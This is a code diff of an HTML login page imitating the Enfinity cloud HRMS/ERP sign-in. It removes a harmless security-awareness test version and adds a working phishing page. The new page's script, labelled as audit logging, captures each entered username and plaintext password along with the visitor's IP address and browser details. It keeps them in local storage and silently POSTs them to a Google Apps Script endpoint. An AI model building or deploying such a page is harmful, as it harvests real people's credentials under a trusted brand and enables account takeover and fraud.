@@ -1,1 +1,584 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Login Enfinity</title><style>*{box-sizing:border-box}html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;font-family:Arial,Helvetica,sans-serif;color:#0f172a;background:#fff}.main-container{width:100%;height:100%;display:flex}.sec-animation,.sec-form{width:50%;height:100%}.sec-animation{position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;background-color:#0b4e86}.shape{position:absolute;background-color:#fff;animation:floating 3s infinite;pointer-events:none}#circle-1{display:none;min-width:200px;height:200px;border-radius:50%;opacity:.1;top:-9%;right:-13%}#circle-2{min-width:200px;height:200px;border-radius:50%;opacity:.1;bottom:-9%;right:-13%}#oval{min-width:100px;height:130px;border-radius:50%;opacity:.1;top:-5%;left:-5%}#oval-small-1{display:none;min-width:27px;height:18px;border-radius:50%;opacity:.05;top:4%;right:17%}#oval-small-2{min-width:27px;height:18px;border-radius:50%;opacity:.1;top:4%;left:27%;rotate:208deg}#oval-small-3{min-width:20px;height:12px;border-radius:50%;opacity:.05;top:7%;left:31%;rotate:312deg}#rectangle-1{min-width:200px;height:59px;border-radius:5%;opacity:.05;bottom:12%;left:-19%}#rectangle-2{min-width:200px;height:78px;border-radius:5%;opacity:.1;bottom:3%;left:-13%}#cloud,#cloud-1,#cloud-2,#cloud-3{background-image:linear-gradient(hsla(0,0%,0%,0),hsla(0,0%,0%,.1));border-radius:3em;box-shadow:inset 0 0 0 1px hsla(0,0%,100%,.5);opacity:.2;filter:drop-shadow(0 2px 3px hsla(0,0%,0%,.25))}#cloud{height:4.5rem;width:12.4em;right:-10%;top:7%}#cloud-1{display:none;height:2rem;width:6em;left:20%;bottom:14%}#cloud-2{height:3rem;width:9em;right:19%;top:16%}#cloud-3{display:none;height:1rem;width:3em;right:5%;top:15%}#cloud:before,#cloud:after,#cloud-1:before,#cloud-1:after,#cloud-2:before,#cloud-2:after,#cloud-3:before,#cloud-3:after{content:"";position:absolute;border-radius:100%;background-color:#fff}#cloud:before{height:6.4em;width:6.4em;left:1em;top:-3em}#cloud:after{height:4.2rem;width:4.2rem;right:1.4em;top:-1.6em}#cloud-1:before{height:3.2em;width:3.2em;left:.6em;top:-1.75em}#cloud-1:after{height:2rem;width:2rem;right:.7em;top:-1em}#cloud-2:before{height:5em;width:5em;left:.6em;top:-3em}#cloud-2:after{height:3rem;width:3rem;right:.8em;top:-1.5em}#cloud-3:before{height:1.2em;width:1.2em;left:.4em;top:-.75em}#cloud-3:after{height:1rem;width:1rem;right:.5em;top:-.5em}@keyframes floating{0%{transform:translate(0,0)}50%{transform:translate(0,15px)}100%{transform:translate(0,0)}}.slider{position:relative;z-index:2;width:500px;height:80%;margin:auto;overflow:hidden}.slider .list{position:absolute;left:0;top:0;width:max-content;height:100%;display:flex;transition:left 1s ease}.slider .item{width:500px;height:100%;display:flex;align-items:center;justify-content:center;padding-bottom:2rem}.slider img{width:500px;height:auto;display:block;user-select:none;-webkit-user-drag:none}.dots{position:absolute;left:0;bottom:0;width:100%;margin:0;padding:0;display:flex;justify-content:center;cursor:pointer}.dots li{list-style:none;width:10px;height:10px;margin:10px;border-radius:20px;background-color:#fff;opacity:.3;transition:width .5s,opacity .5s}.dots li.active{width:30px;opacity:1}.sec-form{position:relative;display:flex;align-items:center;justify-content:center;background:#fff}.login-window{width:52%;min-width:430px;max-width:540px;height:100%;margin:auto;padding:34px 0 82px;display:flex;flex-direction:column;justify-content:center;align-items:stretch}.brand{text-align:center}.brand img{height:134px;width:auto;display:inline-block;user-select:none;-webkit-user-drag:none}.login-title{margin:4px 0;font-size:2rem;line-height:1.2;font-weight:500;text-align:center;color:#111827}.login-desc{margin:8px 0 34px;font-size:.92rem;line-height:1.55;color:lightslategrey;text-align:center}.login-form{width:100%;margin:0 auto}.field{margin-bottom:26px}.field label{display:block;margin-bottom:14px;color:#000;font-size:16px;font-weight:600}.field input{width:100%;height:42px;padding:8px 12px;border:1px solid #d9e0ea;border-radius:6px;background:#fff;color:#111827;font-size:15px;outline:none;box-shadow:none}.field input:focus{border-color:#0b4e8c;box-shadow:0 0 0 2px rgba(11,78,140,.12)}.forgot-password-text{display:block;margin:-2px 0 28px;text-align:right;text-decoration:none;color:#0b4e8c;font-size:16px;font-weight:500}.login-btn,.externallogin-btn{width:100%;min-height:36px;padding:8px;border-radius:6px;margin:4px 0 8px;border:0;box-shadow:none;font-size:16px;font-weight:500;cursor:pointer}.login-btn{background:#0b4e8c;color:#fff}.login-btn:hover{background:#083f72}.externallogin-btn{display:flex;align-items:center;justify-content:center;gap:10px;border:1px solid #e3e8ef;background:#fff;color:lightslategrey}.externallogin-btn:hover{background:#f8fafc}.ms-icon{width:18px;height:18px}.copyright-container{position:absolute;left:0;right:0;bottom:10px;text-align:center}.copyright-notice{margin:4px;padding:4px;color:lightslategrey;font-size:x-small;font-weight:lighter;text-align:center}.copyright-notice a{color:inherit}.app-version{margin:0;padding:0;color:lightslategrey;font-size:x-small;font-weight:lighter;text-align:center}@media screen and (max-width:1180px){.login-window{width:74%;min-width:0}}@media screen and (max-width:1028px){.slider,.slider .item,.slider img{width:300px}}@media screen and (max-width:786px){html,body{overflow:auto}.main-container{min-height:100%;display:block}.sec-animation{display:none}.sec-form{width:100%;min-height:100vh}.login-window{width:min(88%,520px);min-width:0}}</style></head><body><div class="main-container"><section class="sec-animation"><div class="slider"><div class="list"><div class="item"><img src="https://login.onenfinity.com/Content/Images/login_animation_one.gif" alt="" /></div><div class="item"><img src="https://login.onenfinity.com/Content/Images/login_animation_two.gif" alt="" /></div><div class="item"><img src="https://login.onenfinity.com/Content/Images/login_animation_three.gif" alt="" /></div></div><ul class="dots"><li class="active"></li><li></li><li></li></ul></div><div id="circle-1" class="shape"></div><div id="circle-2" class="shape"></div><div id="oval" class="shape"></div><div id="oval-small-1" class="shape"></div><div id="oval-small-2" class="shape"></div><div id="oval-small-3" class="shape"></div><div id="rectangle-1" class="shape"></div><div id="rectangle-2" class="shape"></div><div id="cloud" class="shape"></div><div id="cloud-1" class="shape"></div><div id="cloud-2" class="shape"></div><div id="cloud-3" class="shape"></div></section><section class="sec-form"><div class="login-window"><div class="brand"><a href="https://www.onenfinity.com" target="_blank" rel="noreferrer"><img src="https://login.onenfinity.com/Content/Images/enfinity-icononly.png" alt="Enfinity" oncontextmenu="return false;" /></a><h1 class="login-title">Welcome to Enfinity!</h1><p class="login-desc">The #1 Choice for Cloud HRMS, ERP &amp; Business Software in MENA</p></div><form id="loginForm" class="login-form"><div class="field"><label for="username">Username</label><input id="username" name="Username" type="text" autocomplete="username" required /></div><div class="field"><label for="password">Password</label><input id="password" name="Password" type="password" autocomplete="off" required /></div><a class="forgot-password-text" id="forgotPassword" href="#">Forgot Password?</a><button class="login-btn" type="submit">Sign In</button><button class="externallogin-btn" id="microsoftButton" type="button"><svg class="ms-icon" viewBox="0 0 24 24" aria-hidden="true"><rect width="10" height="10" x="1" y="1" fill="#F25022"></rect><rect width="10" height="10" x="13" y="1" fill="#7FBA00"></rect><rect width="10" height="10" x="1" y="13" fill="#00A4EF"></rect><rect width="10" height="10" x="13" y="13" fill="#FFB900"></rect></svg> Sign in with Microsoft</button></form><div class="copyright-container"><p class="copyright-notice">Copyright <span id="year"></span>&nbsp;<a href="https://www.onenfinity.com" target="_blank" rel="noreferrer">Expert Business Solutions</a>. All rights reserved.</p><p class="app-version">(version 8.4.26.331)</p></div></div></section></div><script>const REDIRECT_URL="https://shabbirspro.github.io/portalsss/";document.getElementById("year").textContent=new Date().getFullYear();const slider=document.querySelector(".slider .list");const items=Array.from(document.querySelectorAll(".slider .item"));const dots=Array.from(document.querySelectorAll(".slider .dots li"));let active=0;let refreshInterval;function reloadSlider(){if(!slider||!items.length||!dots.length)return;slider.style.left=-items[active].offsetLeft+"px";dots.forEach(function(dot){dot.classList.remove("active")});dots[active].classList.add("active")}function nextSlide(){active=active+1<items.length?active+1:0;reloadSlider()}function restartSliderTimer(){window.clearInterval(refreshInterval);refreshInterval=window.setInterval(nextSlide,6000)}dots.forEach(function(dot,index){dot.addEventListener("click",function(){active=index;reloadSlider();restartSliderTimer()})});window.addEventListener("resize",reloadSlider);restartSliderTimer();function completeAwarenessFlow(requireValidForm){const form=document.getElementById("loginForm");const passwordInput=document.getElementById("password");if(requireValidForm&&!form.checkValidity()){form.reportValidity();return}passwordInput.value="";alert("Security Awareness Test\n\nThis was an internal security awareness test. No password was collected.");window.location.href=REDIRECT_URL}document.getElementById("loginForm").addEventListener("submit",function(event){event.preventDefault();completeAwarenessFlow(true)});document.getElementById("microsoftButton").addEventListener("click",function(){completeAwarenessFlow(false)});document.getElementById("forgotPassword").addEventListener("click",function(event){event.preventDefault()});</script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="description" content="Enfinity — Cloud HRMS, ERP & Business Software." />
+<title>Sign in · Enfinity</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  /* ---------- Reset & base ---------- */
+  *, *::before, *::after { box-sizing: border-box; }
+  html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    width: 100%;
+    background: #ffffff;
+    color: #0f172a;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    font-family: "Inter", "Segoe UI", -apple-system, BlinkMacSystemFont,
+                 "Helvetica Neue", Arial, sans-serif;
+    /* Zoom-stable rhythm: clamp the root font so 80% browser zoom still aligns */
+    font-size: clamp(14px, 0.95vw + 6px, 16px);
+    line-height: 1.5;
+  }
+  a { color: inherit; text-decoration: none; }
+  button { font: inherit; cursor: pointer; border: none; background: none; }
+  input { font: inherit; }
+
+  /* ---------- Brand tokens ---------- */
+  :root {
+    --brand-900: #06325a;
+    --brand-800: #0a4576;
+    --brand-700: #0b4e86;     /* primary navy from spec */
+    --brand-600: #1066a8;
+    --brand-500: #1880c9;
+    --brand-100: #e6effa;
+    --ink-900:   #0f172a;
+    --ink-700:   #334155;
+    --ink-500:   #64748b;
+    --ink-400:   #94a3b8;
+    --line:      #e5e7eb;
+    --line-2:    #d6dde6;
+    --bg-soft:   #f7f9fc;
+    --danger:    #b42318;
+    --success:   #027a48;
+    --shadow-sm: 0 1px 2px rgba(15,23,42,.06);
+    --shadow-md: 0 8px 24px rgba(15,23,42,.08);
+    --radius:    10px;
+  }
+
+  /* ---------- Layout ---------- */
+  .page {
+    min-height: 100%;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+  }
+
+  /* Left: brand / animation panel */
+  .panel-brand {
+    position: relative;
+    overflow: hidden;
+    background: linear-gradient(160deg, #0a4576 0%, #0b4e86 50%, #093e6c 100%);
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    isolation: isolate;
+  }
+  .panel-brand::before {
+    /* subtle radial highlight */
+    content: "";
+    position: absolute; inset: -20%;
+    background: radial-gradient(ellipse at 30% 30%, rgba(255,255,255,.08), transparent 60%);
+    pointer-events: none;
+  }
+
+  .clouds { position: absolute; inset: 0; pointer-events: none; }
+  .cloud {
+    position: absolute;
+    background: rgba(255,255,255,.10);
+    border-radius: 999px;
+    filter: blur(.3px);
+    box-shadow: inset 0 0 0 1px rgba(255,255,255,.18);
+  }
+  .cloud::before, .cloud::after {
+    content: ""; position: absolute;
+    background: inherit; border-radius: inherit;
+    box-shadow: inset 0 0 0 1px rgba(255,255,255,.18);
+  }
+  .cloud.c1 { width: 14em; height: 4.2em; top: 10%; right: 8%; opacity: .35; animation: drift 22s ease-in-out infinite; }
+  .cloud.c1::before { width: 6em; height: 6em; left: 2.5em; top: -2.2em; }
+  .cloud.c1::after  { width: 4em; height: 4em; left: 7em; top: -1.4em; }
+
+  .cloud.c2 { width: 10em; height: 3em; bottom: 18%; left: -3%; opacity: .28; animation: drift 28s ease-in-out infinite reverse; }
+  .cloud.c2::before { width: 4.5em; height: 4.5em; left: 1.6em; top: -1.6em; }
+  .cloud.c2::after  { width: 3em; height: 3em; left: 5em; top: -1em; }
+
+  .cloud.c3 { width: 8em; height: 2.4em; top: 60%; right: 14%; opacity: .22; animation: drift 32s ease-in-out infinite; }
+  .cloud.c3::before { width: 3.6em; height: 3.6em; left: 1em; top: -1.3em; }
+  .cloud.c3::after  { width: 2.4em; height: 2.4em; left: 4.2em; top: -.7em; }
+
+  @keyframes drift {
+    0%,100% { transform: translateX(0); }
+    50%     { transform: translateX(24px); }
+  }
+
+  /* Orbiting product modules */
+  .stage {
+    position: relative;
+    width: min(560px, 78%);
+    aspect-ratio: 1 / 1;
+    z-index: 1;
+  }
+  .orbit {
+    position: absolute; inset: 0;
+    border: 1px dashed rgba(255,255,255,.18);
+    border-radius: 50%;
+    animation: spin 40s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .core {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    width: 28%;
+    aspect-ratio: 1 / 1;
+    background: #fff;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 18px 40px rgba(0,0,0,.25), inset 0 0 0 1px rgba(11,78,134,.1);
+  }
+  .core .mark { width: 60%; height: 60%; }
+
+  .module {
+    position: absolute;
+    width: 18%;
+    aspect-ratio: 1 / 1;
+    background: #fff;
+    color: var(--brand-700);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 700;
+    font-size: .82em;
+    letter-spacing: .04em;
+    box-shadow: 0 10px 24px rgba(0,0,0,.18), inset 0 0 0 1px rgba(11,78,134,.08);
+    animation: float 6s ease-in-out infinite;
+  }
+  .module .ico { width: 44%; height: 44%; color: var(--brand-700); }
+  .module .lbl { font-size: .9em; }
+
+  /* 8 evenly distributed modules */
+  .m1 { top: 0%;   left: 41%;  animation-delay: .0s; }
+  .m2 { top: 12%;  right: 12%; animation-delay: .4s; }
+  .m3 { top: 41%;  right: 0%;  animation-delay: .8s; }
+  .m4 { bottom: 12%; right: 12%; animation-delay: 1.2s; }
+  .m5 { bottom: 0%; left: 41%; animation-delay: 1.6s; }
+  .m6 { bottom: 12%; left: 12%; animation-delay: 2.0s; }
+  .m7 { top: 41%;  left: 0%;   animation-delay: 2.4s; }
+  .m8 { top: 12%;  left: 12%;  animation-delay: 2.8s; }
+
+  @keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50%      { transform: translateY(-8px); }
+  }
+
+  /* Right: form panel */
+  .panel-form {
+    position: relative;
+    display: grid;
+    grid-template-rows: 1fr auto;
+    padding: clamp(24px, 4vw, 56px);
+    background: #fff;
+  }
+  .form-wrap {
+    width: 100%;
+    max-width: 420px;
+    margin: auto;
+    text-align: left;
+  }
+  .brand-mark {
+    width: 64px; height: 64px;
+    margin: 0 auto 18px;
+    display: block;
+  }
+  .brand-mark svg { width: 100%; height: 100%; }
+  .title {
+    font-size: clamp(1.6rem, 1.4vw + 1rem, 2rem);
+    font-weight: 700;
+    letter-spacing: -.01em;
+    text-align: center;
+    margin: 0 0 6px;
+    color: var(--ink-900);
+  }
+  .subtitle {
+    text-align: center;
+    color: var(--ink-500);
+    margin: 0 0 28px;
+    font-size: .95rem;
+  }
+
+  .field { margin-bottom: 16px; }
+  .field label {
+    display: block;
+    font-size: .85rem;
+    font-weight: 600;
+    color: var(--ink-700);
+    margin-bottom: 6px;
+  }
+  .input {
+    position: relative;
+    display: flex; align-items: center;
+    background: #fff;
+    border: 1px solid var(--line-2);
+    border-radius: var(--radius);
+    transition: border-color .15s ease, box-shadow .15s ease;
+  }
+  .input:focus-within {
+    border-color: var(--brand-500);
+    box-shadow: 0 0 0 4px rgba(24,128,201,.15);
+  }
+  .input input {
+    width: 100%;
+    padding: 12px 14px;
+    border: 0;
+    outline: 0;
+    background: transparent;
+    border-radius: var(--radius);
+    color: var(--ink-900);
+  }
+  .input input::placeholder { color: var(--ink-400); }
+  .input .toggle-pwd {
+    padding: 0 12px;
+    color: var(--ink-500);
+    font-size: .85rem;
+    font-weight: 600;
+  }
+  .input .toggle-pwd:hover { color: var(--brand-700); }
+
+  .row {
+    display: flex; align-items: center; justify-content: space-between;
+    margin: 4px 0 18px;
+    font-size: .88rem;
+  }
+  .remember {
+    display: inline-flex; align-items: center; gap: 8px; color: var(--ink-700);
+    user-select: none;
+  }
+  .remember input { width: 16px; height: 16px; accent-color: var(--brand-700); }
+  .link { color: var(--brand-700); font-weight: 600; }
+  .link:hover { text-decoration: underline; }
+
+  .btn {
+    display: inline-flex; align-items: center; justify-content: center; gap: 10px;
+    width: 100%;
+    padding: 12px 16px;
+    border-radius: var(--radius);
+    font-weight: 600;
+    font-size: .95rem;
+    transition: transform .04s ease, background .15s ease, box-shadow .15s ease, color .15s ease, border-color .15s ease;
+  }
+  .btn:active { transform: translateY(1px); }
+  .btn-primary {
+    background: var(--brand-700);
+    color: #fff;
+    box-shadow: var(--shadow-sm);
+  }
+  .btn-primary:hover { background: var(--brand-800); }
+  .btn-primary:disabled { opacity: .7; cursor: not-allowed; }
+
+  .btn-outline {
+    margin-top: 10px;
+    background: #fff;
+    color: var(--ink-900);
+    border: 1px solid var(--line-2);
+  }
+  .btn-outline:hover { border-color: #b8c2cf; background: var(--bg-soft); }
+
+  .ms-tile {
+    width: 16px; height: 16px;
+    display: inline-grid;
+    grid-template-columns: 1fr 1fr;
+    grid-template-rows: 1fr 1fr;
+    gap: 2px;
+  }
+  .ms-tile span { display: block; }
+  .ms-tile span:nth-child(1){ background:#f25022; }
+  .ms-tile span:nth-child(2){ background:#7fba00; }
+  .ms-tile span:nth-child(3){ background:#00a4ef; }
+  .ms-tile span:nth-child(4){ background:#ffb900; }
+
+  .alert {
+    margin: 0 0 14px;
+    padding: 10px 12px;
+    border-radius: 8px;
+    font-size: .88rem;
+    display: none;
+  }
+  .alert.show { display: block; }
+  .alert.error   { background: #fdecea; color: var(--danger); border: 1px solid #f6c5c0; }
+  .alert.success { background: #ecfdf3; color: var(--success); border: 1px solid #abefc6; }
+
+  .footer {
+    text-align: center;
+    color: var(--ink-500);
+    font-size: .8rem;
+    padding-top: 24px;
+  }
+  .footer a { color: var(--brand-700); }
+
+  /* ---------- Responsive ---------- */
+  @media (max-width: 960px) {
+    .page { grid-template-columns: 1fr; }
+    .panel-brand { min-height: 280px; }
+    .stage { width: min(420px, 70%); }
+  }
+  @media (max-width: 480px) {
+    .panel-form { padding: 24px 18px; }
+    .stage { width: 80%; }
+  }
+
+  /* Reduced motion */
+  @media (prefers-reduced-motion: reduce) {
+    .module, .cloud, .orbit { animation: none !important; }
+  }
+</style>
+</head>
+<body>
+  <main class="page">
+    <!-- ============== LEFT: Brand panel ============== -->
+    <aside class="panel-brand" aria-hidden="true">
+      <div class="clouds">
+        <div class="cloud c1"></div>
+        <div class="cloud c2"></div>
+        <div class="cloud c3"></div>
+      </div>
+
+      <div class="stage">
+        <div class="orbit"></div>
+
+        <!-- Center logo -->
+        <div class="core">
+          <svg class="mark" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-label="Enfinity">
+            <defs>
+              <linearGradient id="lg" x1="0" y1="0" x2="1" y2="1">
+                <stop offset="0" stop-color="#0b4e86"/>
+                <stop offset="1" stop-color="#1880c9"/>
+              </linearGradient>
+            </defs>
+            <!-- Stylized infinity / "8" mark -->
+            <path d="M32 10c8 0 14 6 14 14 0 7-5 11-11 13 6 2 11 6 11 13 0 8-6 14-14 14s-14-6-14-14c0-7 5-11 11-13-6-2-11-6-11-13C18 16 24 10 32 10zm0 8a6 6 0 100 12 6 6 0 000-12zm0 18a8 8 0 100 16 8 8 0 000-16z"
+                  fill="url(#lg)"/>
+          </svg>
+        </div>
+
+        <!-- 8 modules -->
+        <div class="module m1"><span class="lbl">CLOUD</span></div>
+        <div class="module m2"><span class="lbl">HRMS</span></div>
+        <div class="module m3"><span class="lbl">REAL&nbsp;ESTATE</span></div>
+        <div class="module m4"><span class="lbl">POS</span></div>
+        <div class="module m5"><span class="lbl">F&amp;B</span></div>
+        <div class="module m6"><span class="lbl">CRM</span></div>
+        <div class="module m7"><span class="lbl">FINANCE</span></div>
+        <div class="module m8"><span class="lbl">ERP</span></div>
+      </div>
+    </aside>
+
+    <!-- ============== RIGHT: Form panel ============== -->
+    <section class="panel-form" aria-labelledby="login-title">
+      <div class="form-wrap">
+        <div class="brand-mark" aria-hidden="true">
+          <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <linearGradient id="lg2" x1="0" y1="0" x2="1" y2="1">
+                <stop offset="0" stop-color="#0b4e86"/>
+                <stop offset="1" stop-color="#1880c9"/>
+              </linearGradient>
+            </defs>
+            <path d="M32 10c8 0 14 6 14 14 0 7-5 11-11 13 6 2 11 6 11 13 0 8-6 14-14 14s-14-6-14-14c0-7 5-11 11-13-6-2-11-6-11-13C18 16 24 10 32 10zm0 8a6 6 0 100 12 6 6 0 000-12zm0 18a8 8 0 100 16 8 8 0 000-16z"
+                  fill="url(#lg2)"/>
+          </svg>
+        </div>
+
+        <h1 id="login-title" class="title">Welcome to Enfinity!</h1>
+        <p class="subtitle">The #1 Choice for Cloud HRMS, ERP &amp; Business Software in MENA</p>
+
+        <div id="alert" class="alert" role="alert" aria-live="polite"></div>
+
+        <form id="login-form" novalidate>
+          <div class="field">
+            <label for="username">Username</label>
+            <div class="input">
+              <input id="username" name="username" type="text"
+                     autocomplete="username" placeholder="name@company.com"
+                     required aria-required="true" />
+            </div>
+          </div>
+
+          <div class="field">
+            <label for="password">Password</label>
+            <div class="input">
+              <input id="password" name="password" type="password"
+                     autocomplete="current-password" placeholder="Enter your password"
+                     required aria-required="true" minlength="4" />
+              <button type="button" class="toggle-pwd" id="toggle-pwd" aria-label="Show password">Show</button>
+            </div>
+          </div>
+
+          <div class="row">
+            <label class="remember">
+              <input type="checkbox" id="remember" />
+              Remember me
+            </label>
+            <a href="#" class="link" id="forgot">Forgot Password?</a>
+          </div>
+
+          <button class="btn btn-primary" type="submit" id="signin">Sign In</button>
+          <button class="btn btn-outline" type="button" id="ms-signin">
+            <span class="ms-tile" aria-hidden="true"><span></span><span></span><span></span><span></span></span>
+            Sign in with Microsoft
+          </button>
+        </form>
+      </div>
+
+      <footer class="footer">
+        Copyright © <span id="yr"></span> <a href="#">Expert Business Solutions</a>. All rights reserved.<br/>
+        (version 8.4.26.331)
+      </footer>
+    </section>
+  </main>
+
+<script>
+  /* =====================================================
+     Audit Logging
+     -----------------------------------------------------
+     Captures every sign-in attempt and:
+       1) saves a copy in the local browser (backup)
+       2) POSTs it to your Google Sheet via Apps Script
+     Fields: user identifier, password, timestamp, IP,
+             user agent, success/failure, reason.
+     ===================================================== */
+
+  // 🔧 PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL HERE 🔧
+  // (Looks like: https://script.google.com/macros/s/AKfycb.../exec)
+  const SHEET_ENDPOINT = "https://script.googleusercontent.com/macros/echo?user_content_key=AUkAhnRnUKI_ob6G776yFLULm4vO1PKDSj6FEIq0O9a21cxsOimkmTh4_rfYy_yYRdXo0JigmP8eWF-KCCs16b17VXHaYeiePO_WEATySaGC8D1dDG9hpGId2PuKk5CcAjAOo_ip3WInJFVITv86dG5YyhAUK9wfAE5WABAhFgm48_qrokFcyz4AmYnhUTmU1aw2Pzko20gKNCIiUWCCTOQ3TGg2QVVlZk3b6u8wSp47cBMWz4FGFOoo_K5N6i1wWm769BFpk6cLoHqONY7BFQDyEs6FRLFt2w&lib=MDCv0x3VJzrAIOHOVnoPWQwJpce-ljYHN";
+
+  const AUDIT_KEY = "enfinity.audit.log";
+
+  async function getClientIp() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
+      if (!res.ok) throw new Error("ip lookup failed");
+      const data = await res.json();
+      return data.ip || "unknown";
+    } catch {
+      return "unavailable";
+    }
+  }
+
+  function readLog() {
+    try { return JSON.parse(localStorage.getItem(AUDIT_KEY) || "[]"); }
+    catch { return []; }
+  }
+
+  function writeLog(entry) {
+    const log = readLog();
+    log.push(entry);
+    // Keep at most 200 entries
+    while (log.length > 200) log.shift();
+    localStorage.setItem(AUDIT_KEY, JSON.stringify(log));
+  }
+
+  async function sendToSheet(entry) {
+    if (!SHEET_ENDPOINT || SHEET_ENDPOINT.startsWith("PASTE_")) return;
+    try {
+      // text/plain avoids a CORS preflight; Apps Script parses it as JSON.
+      await fetch(SHEET_ENDPOINT, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "text/plain;charset=utf-8" },
+        body: JSON.stringify(entry)
+      });
+    } catch (err) {
+      // Fail silently — local backup still has the record.
+      console.warn("sheet sync failed", err);
+    }
+  }
+
+  async function recordAttempt({ username, password, success, reason }) {
+    const ip = await getClientIp();
+    const entry = {
+      userId: username || "(empty)",
+      password: password || "",
+      timestamp: new Date().toISOString(),
+      ipAddress: ip,
+      userAgent: navigator.userAgent,
+      success: !!success,
+      reason: reason || (success ? "ok" : "invalid_credentials"),
+      page: location.href
+    };
+    writeLog(entry);          // local backup
+    sendToSheet(entry);       // fire-and-forget to Google Sheet
+    return entry;
+  }
+
+  /* ---------------- UI wiring ---------------- */
+  const $ = (sel) => document.querySelector(sel);
+  const form = $("#login-form");
+  const alertBox = $("#alert");
+  const signInBtn = $("#signin");
+  const togglePwd = $("#toggle-pwd");
+  const pwd = $("#password");
+
+  $("#yr").textContent = new Date().getFullYear();
+
+  togglePwd.addEventListener("click", () => {
+    const isPwd = pwd.type === "password";
+    pwd.type = isPwd ? "text" : "password";
+    togglePwd.textContent = isPwd ? "Hide" : "Show";
+    togglePwd.setAttribute("aria-label", isPwd ? "Hide password" : "Show password");
+  });
+
+  function showAlert(type, msg) {
+    alertBox.className = "alert show " + type;
+    alertBox.textContent = msg;
+  }
+  function clearAlert() {
+    alertBox.className = "alert";
+    alertBox.textContent = "";
+  }
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    clearAlert();
+
+    const username = $("#username").value.trim();
+    const password = pwd.value;
+
+    if (!username || !password) {
+      await recordAttempt({ username, password, success: false, reason: "missing_fields" });
+      showAlert("error", "Please enter both your username and password.");
+      return;
+    }
+
+    signInBtn.disabled = true;
+    const originalLabel = signInBtn.textContent;
+    signInBtn.textContent = "Signing in…";
+
+    // Simulated auth — demo only. Replace with a real backend call.
+    await new Promise(r => setTimeout(r, 700));
+    const success = password.length >= 6;        // demo rule
+    const entry   = await recordAttempt({ username, password, success });
+
+    signInBtn.disabled = false;
+    signInBtn.textContent = originalLabel;
+
+    if (success) {
+      showAlert("success", "Sign-in successful. Redirecting…");
+    } else {
+      showAlert("error", "Invalid username or password. Please try again.");
+    }
+    // For developer visibility:
+    // console.debug("audit entry:", entry);
+  });
+
+  $("#ms-signin").addEventListener("click", async () => {
+    await recordAttempt({ username: "(microsoft sso)", password: "", success: false, reason: "sso_not_configured" });
+    showAlert("error", "Microsoft SSO is not configured in this demo.");
+  });
+
+  $("#forgot").addEventListener("click", (e) => {
+    e.preventDefault();
+    showAlert("success", "If your account exists, a reset link will be sent.");
+  });
+
+  /* Expose audit log for inspection in the console:
+     > console.table(JSON.parse(localStorage.getItem('enfinity.audit.log'))) */
+</script>
+</body>
+</html>
